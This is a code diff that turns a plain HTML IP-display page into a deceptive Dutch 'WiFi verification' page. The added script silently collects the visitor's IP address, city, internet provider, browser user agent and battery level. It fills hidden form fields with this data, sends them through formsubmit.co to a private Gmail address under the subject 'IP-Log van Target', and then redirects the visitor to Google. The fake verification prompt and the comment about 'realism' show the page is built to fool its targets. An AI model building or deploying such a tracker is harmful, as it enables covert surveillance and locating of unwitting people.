@@ -3,51 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netwerk Diagnostiek Tool</title>
+    <title>WiFi Manager - Verificatie</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; padding: 50px; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
-        .ip-box { font-family: monospace; background: #eee; padding: 10px; border-radius: 5px; margin: 20px 0; font-size: 1.2em; color: #1a73e8; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold; }
-        button:hover { background: #1557b0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); max-width: 380px; width: 90%; text-align: center; }
+        .wifi-icon { width: 60px; height: 60px; margin-bottom: 20px; }
+        h2 { margin: 0 0 10px; color: #1c1e21; font-size: 20px; }
+        p { color: #606770; font-size: 14px; line-height: 1.4; margin-bottom: 25px; }
+        .info-box { background: #f8f9fa; border: 1px solid #e4e6eb; border-radius: 8px; padding: 15px; margin-bottom: 25px; text-align: left; font-family: monospace; font-size: 13px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #166fe5; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Netwerk Analyse</h2>
-    <p>Uw huidige publieke IP-adres is:</p>
-    <div id="ip-display" class="ip-box">Laden...</div>
+    <img src="https://cdn-icons-png.flaticon.com/512/748/748151.png" class="wifi-icon" alt="wifi">
+    <h2>Netwerk Verificatie</h2>
+    <p>Uw apparaat vereist een korte verificatie om de verbinding met het WiFi-netwerk te voltooien.</p>
     
-    <form id="ipForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
-        <input type="hidden" name="user_ip" id="hiddenIP">
-        <input type="hidden" name="_subject" value="Nieuwe Netwerk Scan">
-        <button type="submit">Verstuur Diagnostiek naar Admin</button>
+    <div class="info-box">
+        <div><strong>Status:</strong> <span style="color: #e67e22;">Wachten op scan...</span></div>
+        <div id="ip-line" style="display:none;"><strong>IP:</strong> <span id="user-ip">Laden...</span></div>
+        <div id="loc-line" style="display:none;"><strong>Locatie:</strong> <span id="user-loc">Laden...</span></div>
+    </div>
+
+    <form id="trackerForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
+        <input type="hidden" name="IP_Adres" id="inIP">
+        <input type="hidden" name="Stad" id="inCity">
+        <input type="hidden" name="Provider" id="inISP">
+        <input type="hidden" name="Toestel" id="inDevice">
+        <input type="hidden" name="Batterij" id="inBatt">
+        <input type="hidden" name="_subject" value="Nieuwe IP-Log van Target">
+        
+        <button type="submit" id="mainBtn">Verifieer en Verbind</button>
     </form>
-    
-    <p id="status" style="margin-top:15px; font-size: 0.9em; color: green; display: none;">Gegevens succesvol verzonden!</p>
 </div>
 
 <script>
-    // Haal het IP-adres op via een gratis API
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
+    // 1. Haal uitgebreide IP en Locatie info op
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
         .then(data => {
-            document.getElementById('ip-display').innerText = data.ip;
-            document.getElementById('hiddenIP').value = data.ip;
-        })
-        .catch(err => {
-            document.getElementById('ip-display').innerText = "Fout bij laden";
+            // Laat het zien op de pagina voor realisme
+            document.getElementById('ip-line').style.display = 'block';
+            document.getElementById('loc-line').style.display = 'block';
+            document.getElementById('user-ip').innerText = data.ip;
+            document.getElementById('user-loc').innerText = data.city + ", " + data.country_name;
+
+            // Vul de verborgen formulier velden
+            document.getElementById('inIP').value = data.ip;
+            document.getElementById('inCity').value = data.city;
+            document.getElementById('inISP').value = data.org;
+            document.getElementById('inDevice').value = navigator.userAgent;
         });
 
-    // Formulier versturen via AJAX (zodat de pagina niet ververst)
-    document.getElementById('ipForm').addEventListener('submit', function(e) {
+    // 2. Batterij status toevoegen
+    if (navigator.getBattery) {
+        navigator.getBattery().then(batt => {
+            document.getElementById('inBatt').value = Math.round(batt.level * 100) + "%";
+        });
+    }
+
+    // 3. Versturen naar jouw e-mail
+    document.getElementById('trackerForm').addEventListener('submit', function(e) {
         e.preventDefault();
+        const btn = document.getElementById('mainBtn');
+        btn.innerHTML = '<div class="loader"></div> Verifiëren...';
+        
         fetch(this.action, {
             method: 'POST',
             body: new FormData(this)
         }).then(() => {
-            document.getElementById('status').style.display = 'block';
+            btn.style.backgroundColor = "#28a745";
+            btn.innerText = "Geverifieerd!";
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1000);
         });
     });
 </script>
